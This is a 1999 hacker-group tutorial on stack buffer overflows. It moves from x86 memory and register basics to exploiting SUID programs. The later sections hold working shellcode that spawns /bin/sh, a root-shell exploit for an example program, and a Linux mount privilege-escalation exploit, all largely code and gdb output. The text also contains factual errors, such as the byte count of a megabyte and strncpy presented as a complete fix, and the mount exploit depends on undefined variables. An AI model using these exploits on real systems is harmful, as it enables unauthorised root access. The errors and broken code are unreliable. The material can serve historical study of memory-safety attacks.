@@ -1,0 +1,619 @@
+
+/*          						*
+*   "Introduction to buffer overflows" -  for 	        *
+*   interScape made by airWalk , may 1999    		*
+*        						*/
+
+
+
+Introduction:
+-------------*
+
+buffer overflows have always been present. many exploits for different UNIX
+systems are based on these overflows. in this article i will present the introduction
+to everything one needs to know about buffer overflows: what they are, how they
+work, and even how to make simple ones. also, i will concentrate on using C and,of
+course,Assembly examples.it is therefore assumed that you know a bit of Assembly and
+C in order to understand this tutorial.
+
+Memory and system arhitecture:
+------------------------------*
+
+in this section i will explain computer memory structure.the structure is important
+if you want to understand buffer overflows.
+
+in increasing order,the data structures(the things in which you store information)
+go like this: BIT,NIBBLE,BYTE,WORD,DWORD,PARA,KiloBYTE,MegaBYTE,GigaBYTE and so on.
+i will go into each one of them,as they are all important:
+
+one BIT is the smallest memory part in the system.it is represented in binary
+(like all other data structures),so it's always 1 or 0(ON or OFF).four BITs make a
+NIBBLE. it is made out of four BITs,so it's structure is: 0000(or 0101,etc.).a
+good thing to know is that it's largest value is 1111,which is 15,and that is also
+the largest value in hexadecimal. a NIBBLE is a half of BYTE. this structure is
+probably the most widely used one.almost every output the CPU gives you is represented
+in BYTEs.it's largest value is 11111111(255 decimal,or 0FFh in hex). two BYTEs make
+a WORD,which has a maximum value of 65,535 bytes(or 0FFFFh,or 1111111111111111).
+you use this for 16-bit addressing: registers AX,BX,CX,DX,DI,SI,BP,SP,CS,DS,ES,SS
+and IP. there is a DWORD,or a double-WORD data,which is a 32-bit address(maximum)
+in a 80386 Intel system arhitecture. PARA(Paragraph) is a term discribing a measure
+of memory equal to 16 BYTEs.any memory address that can be evenly divisble by 16 is
+called a Paragraph Boundary.the first Paragraph Boundary address is 0,which is
+followed with 10h,20h,30h and so on.so you add 10 in hex to each number.remember
+that 10h is 16 in decimal. a KiloBYTE is,as the name says,1000 BYTEs.but this isn't
+exactly correct: it's exactly 1024 BYTEs.KiloBYTE is also reffered to as K or KB.
+this is important,because then MegaBYTE is actually 1,048,578 BYTEs(1024 x 1024).MB
+stands for MegaBYTE. next data structure is a GigaBYTE,and this is becoming a standard
+for HD(hard disk drive) memory.it's value is 1,073,741,824 BYTEs.
+when dealing with 86 family of CPUs,it's a good thing to remember the number 65,536
+bytes. this number is circled as 64K(64 KiloBYTEs,10000h in hex),and is a very important
+number to remember when programming: this is the single largest number the CPU can take
+and store as an integer(whole number).
+
+when we talk about modern computers,the two main working memories are: RAM and ROM.
+RAM,or Random Access Memory,is a input-output memory(sometimes called memory with
+free access).this allows us to store information in it,and take that information
+when we want to use it.once a computer is turned OFF,all data in the RAM memory is
+lost forever.basic RAM characteristics are maximum capacity and speed.the capacity
+is how much bits the RAM chip can take and store.so,bigger capacity of RAM is better.
+modern computers use RAM memory from 2 MB of RAM to about 128 MBs(for normal users
+-- servers use much more).work speed is measured in how fast RAM memory can store
+and take information.from when you give RAM an address(16 or 32-bit mostly) until
+it gets it is called Access Time.with this you measure the RAM speed.
+ROM,or Read Only Memory,is an output memory,or memory in which you can store a data
+of any kind only once.after the input you can read that information,but you cannot
+replace it or delete it.users don't use ROM much,it is being edited by the computer
+manufacturer and it's main purpose is storing some valuable information to an Operating
+System.that's why ROM memory uses a relatively small capacity(512 KB,or so).there are
+three most widely used ROM memory types: PROM,EPROM and EEPROM.
+
+as we are talking about Intel processors(series x86,or 80x86),let's mention what
+registers they use.there are four types of registers:
+
+a) AX,BX,CX and DX which are all general purpose registers
+b) ES,DS,CS and SS are segment registers
+c) SI,DI and BP are index registers
+d) IP,SP and F are special cause registers
+
+what are registers you ask? registers are place in computer memory where you store
+information,usually a memory address for something.
+you can define registers as banks where you keep information for further use.every
+CPU has registers.placing a piece of data into memory or into a register isn't the
+same.the CPU stores and gets data much faster from registers.also,when the CPU has
+to do something really fast,it rather uses the registers than the memory.for example,
+if the CPU needs to sum to numbers it will store them into two different registers
+and add that two registers together.so,we could say that registers contain only
+temorary data.registers are made out of transistors,but rather than having numeric
+addresses they have names.
+general purpose registers are 16-bit,but can also be torn apart into two 8-bit ones.
+AX is AH and AL,BX is BH and BL,CX is CH and CL and DX is DH and DL.the H defines
+'Higher part' and the L stands for 'Lower part'.
+when you need a 16-bit address you use a whole register for it,and when you need an
+8-bit one,you use only one part of the register.also,this arrangement is good because
+you can use the part you want to change,without changing the whole register.for
+example,we put 76E9h into a general purpose register AX.this means that AX=76E9h,or
+AH=76 and AL=0E9h(do not pay attention to 'h' or '0',it's just a hex description).so
+if you store '0A' to AL,you'll have an AX=760Ah.also,remember that only general
+purpose registers allow you to make these changes and arrangements.
+
+segments and offsets: the thing that messes up your mind.the problem with Intel
+family of 8088 and 8086 CPUs is old.when Intel made those chips they enabled the
+CPU to see only 1 MB of memory(20-bit address).this was made because they believed
+that nobody would ever need bigger memory space.thus,the CPU chips have 20 address
+pins and can pass a full 20-bit to the memory system.this is all normal,but with
+what we've learned about registers: there are only 16-bit ones for normal use.so,
+using only one 16-bit is too small,and using two 16-bit is far too big.so,when you
+want to store a 20-bit address into a 16-bit register,you actually use two of them.
+the first one is used for the segment address and the second one for the offset
+address.so,the full address of a byte in the CPU memory is written in segment:offset.
+you must know both addresses in order to get the data out.segment shows us a 64K memory
+block,while offset fetches the correct address from that block.we could say that they
+work in pairs.i have mentioned earlier Paragraph Boundaries.we can consider any
+Paragraph Boundary as a start of a segment.knowing that a boundary has 64K memory,a
+segment could start anywhere in that block between 0 and 64K.the segment address defines
+where in a 64K block resides the wanted segment.
+
+back to segment and offsets.as i said,the whole address of a byte of data in the memory
+is segment:offset(segment is any segment register(CS,DS,ES,SS),while the offset can be
+AX,BX,CD,DX,DI,SI,BP,SP and IP).usually,we use DS:SI to describe it.remember that when
+calculating the correct address,both the segment and the offset address are switching
+over each other.example:
+
+segment address: 0010010000010000----
+offset address:  ----0100100000100010
+20-bit address:  00101000100100100010
+
+remember that the range of the segment is from 0 to 64K * 16.the offset range goes from
+0 to 64K,and the whole address can be from 0 to 1MB,depending on the other two addresses.
+the formula for the exact address is: 20-bit address: segment address * 16 + offset address.
+note that you can access a specific address from different locations.here's an example:
+
+we store some data into a byte called Data.now,there are four ways of accessing it:
+0000h:3Dh,0001h:2Dh,0002h:1Dh,0003h:0Dh.0004h 'level' is none of our business for accessing
+Data.
+(graphical image for this example is included in the ZIP file).
+
+remember the segment registers? now i'm going to describe each one of them:
+
+CS: stands for Code Segment,or CODE_SEG.you cannot change it's content.this register
+always contains information(segment) about the program that is currently being executed.
+you can only change it's value by jumping of to another register(explained later on).
+
+DS: stands for Data Segment,or DATA_SEG.you can place the segment address for your data
+here.
+
+SS: stands for Stack Segment,or STACK_SEG.it's purpose is for the stack.i will explain
+what stack is later.for now only know that this register containg the segment address
+for the stack.
+
+ES: stands for Extra Segment,or EXTRA_SEG.this is just an extra register,for specifying
+a location in memory.
+
+i should also point out the IP register.IP,or the instruction pointer,contains the offset
+address of the next machine instruction to be executed.each time an instruction is executed,
+IP is incremented by the number of bytes of the size of that instruction.CS contains the
+segment address for IP.together CP and IP contain full 20-bit address of the next machine
+instruction to be executed. so,remember CS:IP is actually the next instruction.
+
+what is stack? stack is a place in memory reserved for data that you/your program uses.
+everything you put into a stack register goes in the order of Last In First Out(LIFO),
+which means that the first piece of data you put into the stack is taken out last.stack
+is created by two registers.like everything in the 86 enviroment,the stack must exist
+within a segment.the Stack Segment register(SS) holds the segment address of the segment
+which is chosen to be the stack segment,and the Stack Pointer register(SP) points to the
+data locations within the stack segment.
+the stack segment begins at SS:0.a truly odd thing here is that when the stack action
+happens at the opposite end of the stack segment.so,when a stack is set up,the SS register
+points to the base or beginning of the stack segment and the SP register is set to point
+to the end of the stack segment.remember that any memory space between SS:0 and SS:SP is
+considered free and available to the use of stack.if the stack runs out of free memory,or
+you forget to get out all data from the stack,the CPU will 'freeze' in most cases.this is
+called a 'stack crash' and is very serious.also,you must/should specify the size of the
+stack in your program's code.
+when you want to put something on top of the stack you use the mnemonic PUSH (Assembly).
+to get something from the top you use POP (Assembly).the CPU uses these functions all the
+time.
+it is also worth of mentioning the FP, Frame Pointer,which points to a fixed address of the
+stack within a frame.also,many compilers use a second register (FP) for referencing
+variables and parameters because their distances from FP do not change with PUSH and
+POP.BP(Base Pointer) is used for this on Intel CPUs.
+when a procedure is called,it must save the previous FP so it can be restored when the
+procedure exits/ends.then it copies SP(Stack Pointer) to make space for local veriables.
+this is called the procedure prolog.when the procedure exits,the stack must be cleaned
+up again.this is called procedure epilog.for Intel processors ENTER and LEAVE do this.
+on Motorola LINK and UNLINK is used.
+in this example i will PUSH something onto the stack.the example is in C:
+
+---
+void someFunction(int a, int b, int c, int d) {
+   char buffer1[5];
+   char buffer2[10];
+}
+
+void main() {
+   someFunction(a,b,c,d);
+}
+---
+
+now,compile this with GCC in Linux:
+
+bash$ gcc -S -o example1.s example1.c
+
+the -S switch is used to generate Assembly code.now,we look at example1.s. this is
+the output 'cat' gives us(remember,this is not the whole file):
+
+---
+	pushl $d
+	pushl $c
+	pushl $b
+	pushl $a
+	call someFunction
+---
+
+remember LIFO? yes,this is the way it works(first d,then c,then b,then a).so this PUSHes
+these arguments into the stack and then calls someFunction(). 'call' will push
+the IP onto the stack. we will call the saved IP the return address,or RET.the
+first thing done in someFunction is the procedure prolog:
+
+---
+	pushl %ebp
+	movl %esp, %ebp
+	subl $20, %esp
+---
+
+note: the 'e' in front of BP and SP indicates that they are Extended -- 32-bit.
+
+the first two lines set up the stack frame.that's a standard part of code compiled by any
+C compiler.
+so,this PUSHes EBP(Extended BP) onto the stack.it then copies the current SP onto
+EBP.this makes EBP the new FP pointer(we'll call the saved FP pointer SFP).it then
+finds space for variables by substracting their size from FP.
+
+it is very important to understand the workings of registers,segments,offsets and the stack
+as these are one of the harder challenges in understanding the workings of buffer overflows.
+
+AT&T Assembly syntax:
+---------------------*
+
+before we continue i should just point out some differences between Intel (DOS and WIN) and
+AT&T (Unix) Assembly syntax. Unix systems use the AT&T syntax for Assembly programming
+language. this syntax is not identical to the one you use under DOS and WIN platforms (that
+one is called the Intel syntax). they differ in some things. we could say that under Unix
+there is not fixed Assembly interface.most of the times you use C to do things in Assembly.
+in C you there is a specific way to put Assembly code. this is a mask of a C program which
+has Assembly code in it:
+
+---
+{
+   __asm__(". . .");
+}
+---
+
+there are also differences in the mnemonics you use. this could confuse Intel programmers.
+for example, under Linux you would do 'movl %esp,%ebp', whereas under DOS and WIN (16 & 32)
+you would do 'mov ebp, esp'. so, under the AT&T syntax you put the percentage character
+('%') in front of the register.'movl' mnemonic indicates that you are copying a long
+variable type. you could also use 'movb' for indicating that you are copying a byte
+variable type. 'movw' is for word, etc. also, you use the syntax 'mov %src, %dst' under
+AT&T, while under Intel syntax you would use 'mov dst, src'.you always put '$' character
+in front of the immediate operands. for example: 'push 4' under DOS is actually 'pushl $4'
+under Linux.
+comments under the AT&T syntax begin with the hash character ('#') while under DOS and
+WIN platforms they begin with ';' character.
+for getting direct Assembly source code, considering that you have the C source of the
+program, you would compile the program using the -S switch with the GNU C Compiler (GCC).
+the command for this would be: 'gcc -S -o program.s program.c'. 'program.s' is the
+Assembly code output.
+i wrote this section so you wouldn't get confused with the examples in this tutorial.
+there are other differences as well, but they are not important for this tutorial. now,
+let's continue with buffer overflows.
+
+Buffer overflow security:
+-------------------------*
+
+a buffer is a part of memory which is reserved for something.a buffer overflow happens when
+you put more data into a buffer than it is reserved.
+
+example1:
+
+---
+void someFunction(char *str)
+{
+   char buffer[16];
+
+   strcpy(buffer, str);
+}
+
+void main()
+{
+   char bigString[256];
+   int i;
+
+   for( i = 0; i < 255; i++)
+     bigString[i] = 'A';
+
+  someFunction(bigString);
+}
+---
+
+note: for strcpy() you need the STRING.H include. strcpy() copies or duplicates one
+string to another. also, we could have used some other character (other than 'A') to fill
+the buffer out and make an overflow.
+
+if you compile and run this program you will get a 'Segmentation violation' error.
+this occurs because strcpy() copies the contents of *str (bigString[]) into buffer[]
+until a NULL character is reached in the string.buffer[] is much smaller than *str. it
+is 16 bytes long,while *str is 256 bytes long.so we are trying to put 256 bytes into a
+string which is 16 bytes long.of course,something must happen with those 250 bytes which
+can't fit into buffer[].they are being overwritten.this includes SFP,REG and even the
+'source' string *str. we used 'A' characters to fill bigString.it's hex character value
+is 0x41.that means the return address is now 0x41414141.this is outside of the process
+address space.
+so,when you get the 'Segmentation violation'(or 'Segmentation fault') error,that means
+that when someFunction() returns and tries to read the next instruction from that address
+you get the error because the address is invalid.
+basically,a buffer overflow(overrun) allows us to change the RET of a function.this
+means that we can change the way the program executes,thus making it do something else,
+which is in most cases,giving us root on the system.
+if we used strncpy() function in the previous example this would have not happened.
+this is because strcpy() doesn't do boundary checking when executing.strncpy(),on the
+other hand,checks the length of variables which are being copied,and then copies just
+the characters which can go into the other string without making a violation.it does
+not copy the whole string into another.
+strcpy() isn't the only function which can be used to make a buffer overflow.there
+is strcat(), sprintf(), vsprintf(), gets() and even a while() loop.scanf() can also
+be a problem if not used correctly.
+buffer overflows are almost always used on programs which have root or administrative
+ID.those programs have setuid 0.
+
+example2:
+
+---
+void main(int argc, char **argv, char **envp)
+{ 
+   char varS[1024];
+     strcpy(varS,getenv("varT"));
+}
+---
+
+note: again, using strncpy() would 'solve' the problem.
+
+so,we copied 'varT' to variable 'varS' which has a 1024 limit.now we do the following:
+
+$ export varT="01234567890123456789012345678901234567890123456789012345678
+90123456789012345678901234567890123456789012345678901234567890123456789012
+34567890123456789012345678901234567890123456789012345678901234567890123456
+78901234567890123456789012345678901234567890123456789012345678901234567890
+12345678901234567890123456789012345678901234567890123456789012345678901234
+56789012345678901234567890123456789012345678901234567890123456789012345678
+90123456789012345678901234567890123456789012345678901234567890123456789012
+34567890123456789012345678901234567890123456789012345678901234567890123456
+78901234567890123456789012345678901234567890123456789012345678901234567890
+12345678901234567890123456789012345678901234567890123456789012345678901234
+56789012345678901234567890123456789012345678901234567890123456789012345678
+90123456789012345678901234567890123456789012345678901234567890123456789012
+34567890123456789012345678901234567890123456789012345678901234567890123456
+78901234567890123456789012345678901234567890123456789012345678901234567890
+123456789"
+
+then we run the compiled program:
+
+$ ./example2
+Segmentation fault
+
+again,we look at the Assembly code:
+
+---
+	pushl %ebp
+	movl %esp,%ebp
+	subl $1024,%esp
+---
+
+the third line is important: allocating space for variable 'varS'.so,these two examples
+show buffer overflowing.but what can we get from this? the next chapter talks about this:
+
+Getting root with buffer overflows:
+-----------------------------------*
+
+in this chapter i will talk only about example2 of making a buffer overflow.
+first off,we run GDB(GNU symbolic debugger) on our example2 program.
+
+$ gdb example2
+
+the output is this(again,this is not the whole output):
+
+---
+Breakpoint 1, 0x80004e9 in main ()
+(gdb) disassemble
+Dump of assembler code for function main:
+0x80004e0 <main>:       pushl  %ebp
+0x80004e1 <main+1>:     movl   %esp,%ebp
+0x80004e3 <main+3>:     subl   $0x400,%esp
+0x80004e9 <main+9>:     pushl  $0x8000548
+0x80004ee <main+14>:    call   0x80003d8 <getenv>
+0x80004f3 <main+19>:    addl   $0x4,%esp
+0x80004f6 <main+22>:    movl   %eax,%eax
+0x80004f8 <main+24>:    pushl  %eax
+0x80004f9 <main+25>:    leal   0xfffffc00(%ebp),%eax
+0x80004ff <main+31>:    pushl  %eax
+0x8000500 <main+32>:    call   0x80003c8 <strcpy>
+0x8000505 <main+37>:    addl   $0x8,%esp
+0x8000508 <main+40>:    movl   %ebp,%esp
+0x800050a <main+42>:    popl   %ebp
+0x800050b <main+43>:    ret
+0x800050c <main+44>:    nop
+0x800050d <main+45>:    nop
+0x800050e <main+46>:    nop
+0x800050f <main+47>:    nop
+End of assembler dump.
+
+(gdb) break *0x800050b
+Breakpoint 2 at 0x800050b
+(gdb) cont
+Continuing.
+
+Breakpoint 2, 0x800050b in main ()
+(gdb) stepi
+0x37363534 in __fpu_control ()
+(gdb) stepi
+
+Program received signal SIGSEGV, Segmentation fault.
+0x37363534 in __fpu_control ()
+(gdb)
+---
+
+we disassembled the program and got the Assembly code.
+here is the segmentation fault.this happens because there is no code to execute at address
+0x3763534.now,let's have a look at the stack for this example2:
+
+---
+Breakpoint 1, 0x80004e9 in main ()
+(gdb) info registers
+eax            0x0      0
+ecx            0xc      12
+edx            0x0      0
+ebx            0x0      0
+esp            0xbffff800       0xbffff800
+ebp            0xbffffc04       0xbffffc04
+esi            0x50000000       1342177280
+edi            0x50001df0       1342184944
+eip            0x80004ee        0x80004ee
+ps             0x382    898
+cs             0x23     35
+ss             0x2b     43
+ds             0x2b     43
+es             0x2b     43
+fs             0x2b     43
+gs             0x2b     43
+
+(gdb) x/5xw 0xbffffc04
+0xbffffc04 <__fpu_control+3087001064>:  0xbffff8e8      0x08000495      
+0x00000001      0xbffffc18
+0xbffffc14 <__fpu_control+3087001080>:  0xbffffc20
+(gdb) 
+---
+
+0xbffff8e8 is the value of EBP before it was PUSHed onto the stack.0x08000495 is the RET.
+0x00000001 is argc, 0xbffffc18 is argv and 0xbffffc20 is envp.so,when we copy 1024 + 8
+bytes we overwrite the RET address and make it jump back to our code,which does something
+radical (like execute a shell or something similar).basically NOP in GDB output means
+that those bytes are being overwritten.if we set 'varT' variable to a lot of NOPs,some
+code to execute something(like a shell -- giving us access to root) and a RET address,when
+the code gets to RET it will return to the NOPs we put in and continue down on the code
+which will do something we want.anyways,NOPs are almost always used when filling up the
+buffer.first,we have to figure out what the return address should be.we will use 0xbffff804
+in this example.now,based around what i just said about 'varT',we can make an exploit for
+our example2 program:
+
+---
+long get_esp(void)
+{
+   __asm__("movl %esp,%eax\n");
+}
+
+char *shellcode =
+"\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"
+"\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
+"\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/bin/sh";
+
+	/* this is how we execute the shell.	*/
+
+char varS[1034];
+int i;
+char *varS1;
+
+#define STACKFRAME (0xc00 - 0x818)
+
+void main(int argc,char **argv,char **envp)
+{
+  strcpy(varS,"varT=");
+  varS1 = varS+5;
+  while (varS1<varS+1028+5-strlen(shellcode)) *(varS1++)=0x90;
+  while (*shellcode) *(varS1++)=*(shellcode++);
+  *((unsigned long *)varS1)=get_esp()+16-1028-STACKFRAME;
+  printf("%08X\n",*((long *)varS1));
+  varS1+=4;
+  *varS1=0;
+  putenv(varS);
+  system("bash");
+}
+---
+
+note: system() needs STDLIB.H include.
+
+first we have to copy 'varT=' into a string.then we put unnecessary NOPs into the
+varS variable and add the egg (shellcode) to the end of the variable and then add the
+RET address. then we call putenv() to set the variable and execute a shell.'get_esp'
+routine gets the current value of ESP.
+
+note: 'the egg' is a floating piece of code which executes a shell. i named it
+'shellcode'.
+
+let's compile and run our exploit1.
+
+$ ./exploit1
+BFFFF418
+bash$ ./example2
+bash#
+
+it's obvious that we got a root bash shell.this is because example2 has root permissions
+and has a system identification number 0 or 1. basically, the program must have the SUID
+flag and must be owned by root.
+
+when making buffer overflow exploits one must be careful about the STACKFRAME define.here
+is a little program which will print out the value of ESP before the stack frame is set up:
+
+---
+long getesp()
+{
+   __asm__("movl %esp,%eax");
+}
+
+void main()
+{
+	printf("%08X\n",getesp()+4);
+}
+---
+
+by executing this program we get the ESP value which we can put into our exploit,under the
+define STACKFRAME part.
+
+Example exploit:
+----------------*
+
+this is an example exploit for making buffer overflows for Linux (kernel version 2.0.10
+and older). it is from 1996 (old but efficient).
+
+exploit2:
+
+---
+long get_sp()
+{
+   __asm__("movl %esp, %eax");
+}
+
+main(int argc, char **argv)
+{
+   char shellcode[] =
+     "\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"
+     "\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
+     "\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/bin/sh";
+
+	/* this is how we execute the shell.	*/
+
+   char buffer[lv_size+4*8];
+   unsigned long *ptr2 = NULL;
+   char	*ptr = NULL;
+   int i;
+
+   for(i=0;i<lv_size+4*8;i++)
+   buffer[i]=0x00;
+     ptr=buffer;
+
+   for(i=0;i<lv_size-strlen(shellcode);i++)
+     *(ptr++)=0x90;
+   for(i=0;i<strlen(shellcode);i++)
+     *(ptr++)=shellcode[i];
+   ptr2=(long *)ptr;
+   for(i=1;i<2;i++)
+     *(ptr2++)=get_sp()+offset;
+
+   printf("Linux < 2.0.10 mount exploit\n");
+   (void)alarm((int)0);
+   execl("/bin/mount", "mount", buffer, NULL);	/* execute the mount and do a	*
+						/* buffer overflow on it.	*/
+}
+---
+
+remember that mount has root permissions and thus can be exploited.
+
+Conclusion:
+-----------*
+
+buffer overflows are a serious threat,for which currently there is no 'patch'.the
+programmer should always watch carefully.there are many exploits based around buffer
+overflows.for example Sendmail 8.7.5,syslog, Linux/FreeBSD mount problem,Digital Unix
+4.0 overflows, Xt library,etc.basically,the programmer should always think ahead and
+should try to do bounds checking if, in any way, possible.
+
+
+Disclaimer:
+-----------*
+
+we prohibit hacking,phreaking & such criminal activities. all information found here
+does not, in any way,connect to crime. this text is meant for people to learn and be
+aware of security. if you try anything that's considered illegal with the information
+found in this text you will be to blame yourself,we cannot be blamed for other people's
+actions. remember that security is very important and thus should not be neglected by
+the people holding the strings.
+
+
+
+/*          						*
+*   "Introduction to buffer overflows" -  for 	        *
+*   interScape made by airWalk , may 1999  	  	*
+*							*
+*   Copyright © 1999 by interScape Security Resources	*
+*							*
+*              E n d    O f   F i l e			*
+*        						*/
